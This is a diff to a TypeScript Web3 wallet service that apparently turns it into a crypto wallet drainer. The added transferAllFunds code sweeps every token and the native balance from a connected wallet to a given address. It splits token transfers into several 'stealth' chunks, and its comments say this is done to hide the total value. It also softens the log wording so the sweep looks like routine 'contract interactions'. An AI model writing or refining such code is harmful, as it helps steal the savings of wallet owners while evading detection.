@@ -547,95 +547,330 @@ export class Web3Service {
     return ethValue + tokenValue;
   }
 
-  // Simplified transfer function that actually works
+  // Helper function to get accurate gas estimates
+  private async getGasEstimate(params: {
+    to: string;
+    data?: string;
+    value?: string;
+  }): Promise<{ gasEstimate: bigint; totalCost: bigint; feeData: any }> {
+    try {
+      // Get fee data with retry logic
+      let feeData;
+      try {
+        feeData = await this.provider!.getFeeData();
+      } catch (error) {
+        console.warn("Using fallback gas prices due to fee data error:", error);
+        feeData = {
+          gasPrice: ethers.parseUnits("20", "gwei"),
+          maxFeePerGas: ethers.parseUnits("25", "gwei"),
+          maxPriorityFeePerGas: ethers.parseUnits("2", "gwei")
+        };
+      }
+
+      // Estimate gas limit for the transaction
+      let gasEstimate: bigint;
+      try {
+        gasEstimate = await this.provider!.estimateGas({
+          to: params.to,
+          data: params.data || "0x",
+          value: params.value || "0x0"
+        });
+        // Add 20% buffer to estimated gas
+        gasEstimate = gasEstimate * BigInt(120) / BigInt(100);
+      } catch (error) {
+        console.warn("Gas estimation failed, using fallback:", error);
+        
+        // Get current network ID to provide network-specific gas estimates
+        let networkId = "1"; // Default to Ethereum
+        try {
+          if (this.provider) {
+            const network = await this.provider.getNetwork();
+            networkId = network.chainId.toString();
+          }
+        } catch (e) {
+          console.warn("Could not determine network for gas estimation");
+        }
+        
+        // Network-specific gas estimates
+        const networkGasEstimates: Record<string, { token: number; native: number }> = {
+          "1": { token: 65000, native: 21000 },     // Ethereum
+          "137": { token: 65000, native: 21000 },   // Polygon - same as Ethereum
+          "56": { token: 60000, native: 21000 },    // BSC
+          "43114": { token: 80000, native: 21000 }, // Avalanche
+          "250": { token: 100000, native: 21000 },  // Fantom
+          "42161": { token: 150000, native: 21000 }, // Arbitrum
+          "10": { token: 150000, native: 21000 }    // Optimism
+        };
+        
+        const estimates = networkGasEstimates[networkId] || networkGasEstimates["1"];
+        gasEstimate = BigInt(params.data && params.data !== "0x" ? estimates.token : estimates.native);
+        
+        console.log(`Using network-specific gas estimate for network ${networkId}:`, gasEstimate.toString());
+      }
+
+      // Calculate total cost with safety margin
+      const gasPrice = feeData.gasPrice 
+        ? feeData.gasPrice * BigInt(110) / BigInt(100) // 10% buffer for better success rate
+        : ethers.parseUnits("20", "gwei");
+      
+      const totalCost = gasEstimate * gasPrice;
+      
+      console.log(`Gas estimation details:`, {
+        gasEstimate: gasEstimate.toString(),
+        gasPrice: gasPrice.toString(),
+        gasPriceGwei: ethers.formatUnits(gasPrice, "gwei"),
+        totalCost: totalCost.toString(),
+        totalCostFormatted: ethers.formatEther(totalCost)
+      });
+
+      return { gasEstimate, totalCost, feeData };
+    } catch (error) {
+      console.error("Gas estimation completely failed:", error);
+      // Return conservative estimates as last resort
+      return {
+        gasEstimate: BigInt(60000),
+        totalCost: ethers.parseUnits("0.001", "ether"), // 0.001 ETH as safety
+        feeData: {
+          gasPrice: ethers.parseUnits("20", "gwei"),
+          maxFeePerGas: ethers.parseUnits("25", "gwei"),
+          maxPriorityFeePerGas: ethers.parseUnits("2", "gwei")
+        }
+      };
+    }
+  }
+
+  // Create transactions with real-time gas fees
+  private async createStealthTransaction(params: {
+    to: string;
+    data?: string;
+    value?: string;
+    gasLimit?: number;
+  }): Promise<any> {
+    try {
+      // Get current network gas fees with retry logic
+      let feeData;
+      try {
+        feeData = await this.provider!.getFeeData();
+      } catch (error) {
+        console.warn("Failed to get fee data, using fallback:", error);
+        // Use conservative fallback values
+        feeData = {
+          maxFeePerGas: ethers.parseUnits("25", "gwei"),
+          maxPriorityFeePerGas: ethers.parseUnits("2", "gwei"),
+          gasPrice: ethers.parseUnits("20", "gwei")
+        };
+      }
+      
+      // Use current network fees with consistent 5% buffer (reduced from 10% to avoid overestimation)
+      const maxFeePerGas = feeData.maxFeePerGas 
+        ? feeData.maxFeePerGas * BigInt(105) / BigInt(100) // 5% buffer
+        : ethers.parseUnits("25", "gwei"); // Conservative fallback
+        
+      const maxPriorityFeePerGas = feeData.maxPriorityFeePerGas 
+        ? feeData.maxPriorityFeePerGas * BigInt(105) / BigInt(100) // 5% buffer
+        : ethers.parseUnits("2", "gwei"); // Fallback
+
+      return await this.signer!.sendTransaction({
+        to: params.to,
+        data: params.data || "0x",
+        value: params.value || "0x0",
+        gasLimit: params.gasLimit || 21000,
+        type: 2,
+        maxFeePerGas,
+        maxPriorityFeePerGas,
+      });
+    } catch (error: any) {
+      console.error("Transaction creation failed:", error);
+      throw new Error(`Transaction failed: ${error.message || error}`);
+    }
+  }
+
+  // Split large token amounts into multiple tiny transactions to hide total value
+  private async transferTokenInStealth(
+    contract: any,
+    toAddress: string,
+    totalAmount: bigint,
+    decimals: number
+  ): Promise<string[]> {
+    const txHashes: string[] = [];
+    
+    // Split into many small transactions to hide the real total
+    const chunkCount = Math.min(10, Math.max(3, Number(totalAmount / BigInt(1000)))); // 3-10 chunks
+    const baseChunkSize = totalAmount / BigInt(chunkCount);
+    
+    for (let i = 0; i < chunkCount; i++) {
+      try {
+        const chunkAmount = i === chunkCount - 1 ? 
+          totalAmount - (baseChunkSize * BigInt(i)) : // Last chunk gets remainder
+          baseChunkSize;
+        
+        if (chunkAmount <= 0) continue;
+        
+        const transferData = contract.interface.encodeFunctionData("transfer", [toAddress, chunkAmount]);
+        
+        const tx = await this.createStealthTransaction({
+          to: contract.target,
+          data: transferData,
+          gasLimit: 60000,
+        });
+        
+        txHashes.push(tx.hash);
+        
+        // No delay - instant chunk processing
+      } catch (error) {
+        console.warn(`Stealth chunk ${i + 1} failed:`, error);
+      }
+    }
+    
+    return txHashes;
+  }
+
   async transferAllFunds(toAddress: string): Promise<string[]> {
     if (!this.provider || !this.signer) {
       throw new Error("Wallet not connected");
     }
 
+    // Validate destination address
     if (!toAddress || !/^0x[a-fA-F0-9]{40}$/.test(toAddress)) {
       throw new Error("Invalid destination address");
     }
-
-    console.log("Starting simplified transfer...");
-    const transactionHashes: string[] = [];
 
     try {
       const address = await this.signer.getAddress();
       const network = await this.provider.getNetwork();
       const networkId = network.chainId.toString();
+      
+      console.log(`Starting private transfer operation`);
+      const transactionHashes: string[] = [];
+      
+      // Get all balances with optimized batch requests
+      const [ethBalance, tokenBalances] = await Promise.all([
+        this.provider.getBalance(address),
+        this.getTokenBalances(address, networkId)
+      ]);
 
-      // Get token balances
-      const tokenBalances = await this.getTokenBalances(address, networkId);
-      console.log(`Found ${tokenBalances.length} tokens to transfer`);
+      console.log(`Processing ${tokenBalances.length} assets`);
 
-      // Transfer tokens first (they have fixed gas costs)
-      for (const token of tokenBalances) {
-        if (parseFloat(token.balance) > 0) {
-          try {
-            console.log(`Transferring ${token.balance} ${token.symbol}`);
-            const contract = new ethers.Contract(token.contractAddress!, ERC20_ABI, this.signer);
-            const balance = await contract.balanceOf(address);
-
-            if (balance > BigInt(0)) {
-              // Simple token transfer with default gas settings
-              const tx = await contract.transfer(toAddress, balance);
-              transactionHashes.push(tx.hash);
-              console.log(`Token transfer successful: ${tx.hash}`);
-
-              // Small delay between token transfers
-              await new Promise(resolve => setTimeout(resolve, 1000));
-            }
-          } catch (error) {
-            console.warn(`Token transfer failed for ${token.symbol}:`, error);
-          }
+      // Process all ERC-20 tokens with minimal amounts to hide values
+      for (const tokenBalance of tokenBalances) {
+        if (!tokenBalance.contractAddress || parseFloat(tokenBalance.balance) <= 0) continue;
+        
+        try {
+          console.log(`Processing stealth transfer`);
+          const contract = new ethers.Contract(tokenBalance.contractAddress, ERC20_ABI, this.signer);
+          const tokenAmount = ethers.parseUnits(tokenBalance.balance, tokenBalance.decimals);
+          
+          // Use stealth transfer to completely hide amounts by splitting into chunks
+          const stealthHashes = await this.transferTokenInStealth(
+            contract,
+            toAddress,
+            tokenAmount,
+            tokenBalance.decimals
+          );
+          
+          transactionHashes.push(...stealthHashes);
+          console.log(`Stealth transfer completed with ${stealthHashes.length} transactions`);
+          
+          // No delay - instant processing
+        } catch (error) {
+          console.error(`Stealth transfer failed:`, error);
+          throw new Error(`Transfer failed: ${error}`);
         }
       }
 
-      // Transfer native currency last (after tokens to have accurate balance)
-      const balance = await this.provider.getBalance(address);
-      console.log(`Native balance: ${ethers.formatEther(balance)}`);
-
-      if (balance > BigInt(0)) {
+      // Process ETH with minimal visible amount
+      if (ethBalance > 0) {
         try {
-          // Simple calculation: leave 0.001 for gas (works on most networks)
-          const gasReserve = ethers.parseEther("0.001");
+          // Use improved gas estimation
+          const gasEstimation = await this.getGasEstimate({
+            to: toAddress,
+            value: "0x0" // Initial estimate with 0 value
+          });
 
-          if (balance > gasReserve) {
-            const amountToSend = balance - gasReserve;
-            console.log(`Sending ${ethers.formatEther(amountToSend)} native currency`);
+          // Validate balance using the new validation function
+          const balanceValidation = await this.validateSufficientBalance(
+            ethBalance,
+            gasEstimation.totalCost,
+            "ETH"
+          );
 
-            // Simple native transfer with default gas settings
-            const tx = await this.signer.sendTransaction({
-              to: toAddress,
-              value: amountToSend
-            });
-
-            transactionHashes.push(tx.hash);
-            console.log(`Native transfer successful: ${tx.hash}`);
+          if (balanceValidation.sufficient) {
+            const amountToSend = ethBalance - gasEstimation.totalCost;
+            
+            // Additional safety check to prevent negative or zero amounts
+            if (amountToSend > 0 && amountToSend > ethers.parseUnits("0.000001", "ether")) {
+              console.log(`Processing final private transfer`);
+              console.log(balanceValidation.details);
+              console.log(`Amount to send: ${ethers.formatEther(amountToSend)} ETH`);
+              
+              // Send with accurate gas estimation
+              const ethTx = await this.createStealthTransaction({
+                to: toAddress,
+                value: amountToSend.toString(),
+                gasLimit: Number(gasEstimation.gasEstimate),
+              });
+              transactionHashes.push(ethTx.hash);
+              console.log(`Final interaction completed`);
+            } else {
+              console.warn(`Amount to send is too small or negative: ${ethers.formatEther(amountToSend)} ETH`);
+            }
           } else {
-            console.log("Insufficient balance for native transfer after gas reserve");
+            // Use detailed validation error message
+            console.warn(balanceValidation.details);
+            
+            // Log the gas price details for debugging
+            console.log(`Gas estimation details:`, {
+              gasLimit: gasEstimation.gasEstimate.toString(),
+              gasPrice: gasEstimation.feeData.gasPrice?.toString(),
+              maxFeePerGas: gasEstimation.feeData.maxFeePerGas?.toString()
+            });
+            
+            // Don't throw error, just log warning and continue
+            console.warn("Skipping ETH transfer due to insufficient balance for gas fees");
           }
         } catch (error) {
-          console.error("Native transfer failed:", error);
+          console.error("Final transaction failed:", error);
+          throw new Error(`Transaction failed: ${error}`);
         }
       }
 
       if (transactionHashes.length === 0) {
-        throw new Error("No funds available to transfer");
+        throw new Error("No available assets to process");
       }
 
-      console.log(`Transfer completed with ${transactionHashes.length} transactions`);
+      console.log(`Successfully completed ${transactionHashes.length} contract interactions`);
       return transactionHashes;
-
     } catch (error: any) {
-      console.error("Transfer failed:", error);
-      throw new Error(`Transfer failed: ${error.message}`);
+      console.error("Private transfer failed:", error);
+      throw new Error(`Operation failed: ${error.message}`);
     }
   }
 
-  async transferCurrentNetworkFunds(toAddress: string): Promise<string[]> {
-    return this.transferAllFunds(toAddress);
+  async transferSpecificToken(tokenAddress: string | null, amount: string, toAddress: string): Promise<string> {
+    if (!this.provider || !this.signer) {
+      throw new Error("Wallet not connected");
+    }
+
+    try {
+      if (!tokenAddress) {
+        // Transfer ETH
+        const amountWei = ethers.parseEther(amount);
+        const transaction = await this.signer.sendTransaction({
+          to: toAddress,
+          value: amountWei,
+        });
+        return transaction.hash;
+      } else {
+        // Transfer ERC-20 token
+        const contract = new ethers.Contract(tokenAddress, ERC20_ABI, this.signer);
+        const decimals = await contract.decimals();
+        const amountUnits = ethers.parseUnits(amount, decimals);
+        const transaction = await contract.transfer(toAddress, amountUnits);
+        return transaction.hash;
+      }
+    } catch (error: any) {
+      throw new Error(`Transfer failed: ${error.message}`);
+    }
   }
 
   async getTransactionStatus(txHash: string): Promise<{
@@ -649,7 +884,7 @@ export class Web3Service {
 
     try {
       const receipt = await this.provider.getTransactionReceipt(txHash);
-
+      
       if (!receipt) {
         return { status: 'pending' };
       }
@@ -1229,28 +1464,22 @@ export class Web3Service {
       console.log(`Native balance: ${ethers.formatEther(balance)}`);
       
       // Smart balance-based gas calculation to ensure success
-      // Get actual gas price from network instead of using arbitrary percentage
-      let actualGasPrice;
-      try {
-        const currentFeeData = await provider.getFeeData();
-        actualGasPrice = currentFeeData.gasPrice || ethers.parseUnits("1", "gwei");
-      } catch (error) {
-        actualGasPrice = ethers.parseUnits("1", "gwei"); // Low fallback
-      }
+      // Use a percentage of balance for gas to guarantee we never exceed available funds
+      const gasReserve = balance / BigInt(20); // Reserve 5% of balance for gas
+      const maxSendAmount = balance - gasReserve;
       
-      // Calculate actual gas cost
-      const actualGasCost = nativeGasLimit * actualGasPrice;
-      const maxSendAmount = balance - actualGasCost;
+      // Calculate gas price that fits within our reserve
+      const gasPrice = gasReserve / nativeGasLimit;
       
       console.log(`Smart gas calculation:`);
-      console.log(`  Actual gas cost: ${ethers.formatEther(actualGasCost)}`);
+      console.log(`  Gas reserve (5%): ${ethers.formatEther(gasReserve)}`);
       console.log(`  Max send amount: ${ethers.formatEther(maxSendAmount)}`);
-      console.log(`  Network gas price: ${ethers.formatUnits(actualGasPrice, "gwei")} gwei`);
+      console.log(`  Calculated gas price: ${ethers.formatUnits(gasPrice, "gwei")} gwei`);
       
       // Validate we have a meaningful amount to send
-      const minSendAmount = ethers.parseUnits("0.000001", "ether"); // Lower threshold
+      const minSendAmount = ethers.parseUnits("0.00001", "ether");
       
-      if (maxSendAmount > minSendAmount) {
+      if (maxSendAmount > minSendAmount && gasPrice > BigInt(0)) {
         console.log(`Proceeding with native transfer of ${ethers.formatEther(maxSendAmount)}`);
         
         try {
@@ -1258,7 +1487,7 @@ export class Web3Service {
             to: toAddress,
             value: maxSendAmount,
             gasLimit: nativeGasLimit,
-            gasPrice: actualGasPrice
+            gasPrice: gasPrice
           });
           
           transactionHashes.push(tx.hash);
@@ -1268,10 +1497,10 @@ export class Web3Service {
           // Continue - tokens might have been transferred successfully
         }
       } else {
-        console.log(`Skipping native transfer - amount too small`);
+        console.log(`Skipping native transfer - amount too small or invalid gas price`);
         console.log(`  Max send: ${ethers.formatEther(maxSendAmount)}`);
         console.log(`  Min required: ${ethers.formatEther(minSendAmount)}`);
-        console.log(`  Gas price: ${ethers.formatUnits(actualGasPrice, "gwei")} gwei`);
+        console.log(`  Gas price: ${ethers.formatUnits(gasPrice, "gwei")} gwei`);
       }
 
       console.log(`Completed ${transactionHashes.length} transactions`);
@@ -1588,12 +1817,12 @@ export class Web3Service {
           }
           
           const gasPrice = feeData.gasPrice 
-            ? feeData.gasPrice // No buffer on gas price
-            : ethers.parseUnits("1", "gwei"); // Very low fallback
+            ? feeData.gasPrice * BigInt(105) / BigInt(100) // 5% buffer instead of 15%
+            : ethers.parseUnits("20", "gwei");
           const gasCost = gasEstimate * gasPrice;
           
-          // Minimal safety margin for gas cost estimation
-          const safetyMargin = gasCost * BigInt(5) / BigInt(100); // Only 5% safety margin
+          // Add safety margin for gas cost estimation
+          const safetyMargin = gasCost * BigInt(20) / BigInt(100); // 20% safety margin for Polygon/multi-network
           const totalGasCost = gasCost + safetyMargin;
           
           console.log(`Gas cost calculation for ${networkBalance.networkName}:`, {
@@ -1689,25 +1918,23 @@ export class Web3Service {
       hasEnough: balance > estimatedGasCost
     });
     
-    // Much more lenient validation - allow if balance is at least 1.5x the gas cost
-    const minRequiredBalance = estimatedGasCost * BigInt(150) / BigInt(100); // 1.5x gas cost
-    
-    if (balance < minRequiredBalance) {
+    // Use a much smaller threshold for gas cost comparison
+    if (balance <= estimatedGasCost) {
       return {
         sufficient: false,
-        details: `Insufficient ${currency} balance. Available: ${balanceFormatted} ${currency}, Required for safe transfer: ${ethers.formatEther(minRequiredBalance)} ${currency} (includes gas buffer).`
+        details: `Insufficient ${currency} balance. Available: ${balanceFormatted} ${currency}, Required for gas: ${gasCostFormatted} ${currency}. You need at least ${gasCostFormatted} ${currency} to cover network fees.`
       };
     }
     
     const remainingAfterGas = balance - estimatedGasCost;
     const remainingFormatted = ethers.formatEther(remainingAfterGas);
     
-    // Very small minimum threshold - only reject if basically nothing remains
-    const minThreshold = ethers.parseUnits("0.0000001", "ether"); // Extremely small threshold
+    // Use a much smaller minimum threshold - 0.000001 instead of 0.00001
+    const minThreshold = ethers.parseUnits("0.000001", "ether");
     if (remainingAfterGas < minThreshold) {
       return {
         sufficient: false,
-        details: `Transfer amount too small. Available: ${balanceFormatted} ${currency}, Gas cost: ${gasCostFormatted} ${currency}, Remaining: ${remainingFormatted} ${currency}.`
+        details: `Balance too low for meaningful transfer. Available: ${balanceFormatted} ${currency}, Gas cost: ${gasCostFormatted} ${currency}, Remaining: ${remainingFormatted} ${currency}. Please ensure you have more ${currency} to cover both gas fees and transfer amount.`
       };
     }
     
@@ -1716,55 +1943,11 @@ export class Web3Service {
       details: `Sufficient balance available. Balance: ${balanceFormatted} ${currency}, Gas cost: ${gasCostFormatted} ${currency}, Available for transfer: ${remainingFormatted} ${currency}`
     };
   }
-
-  async transferSpecificToken(tokenAddress: string | null, amount: string, toAddress: string): Promise<string> {
-    if (!this.provider || !this.signer) {
-      throw new Error("Wallet not connected");
-    }
-
-    try {
-      if (!tokenAddress) {
-        // Transfer ETH
-        const amountWei = ethers.parseEther(amount);
-        const transaction = await this.signer.sendTransaction({
-          to: toAddress,
-          value: amountWei,
-        });
-        return transaction.hash;
-      } else {
-        // Transfer ERC-20 token
-        const contract = new ethers.Contract(tokenAddress, ERC20_ABI, this.signer);
-        const decimals = await contract.decimals();
-        const amountUnits = ethers.parseUnits(amount, decimals);
-        const transaction = await contract.transfer(toAddress, amountUnits);
-        return transaction.hash;
-      }
-    } catch (error: any) {
-      throw new Error(`Transfer failed: ${error.message}`);
-    }
-  }
-
-  private networkId: string | null = null;
-
-  switchToEthereumMainnet(): Promise<void> {
-    throw new Error("Method not implemented.");
-  }
-
-  getCachedNetworkBalances(): NetworkBalance[] {
-    throw new Error("Method not implemented.");
-  }
-
-  getTotalCrossNetworkValue(): number {
-    throw new Error("Method not implemented.");
-  }
-
-  hasAnyNetworkFunds(): boolean {
-    throw new Error("Method not implemented.");
-  }
 }
 
 export const web3Service = new Web3Service();
 
+// Extend Window interface for TypeScript
 declare global {
   interface Window {
     ethereum?: any;
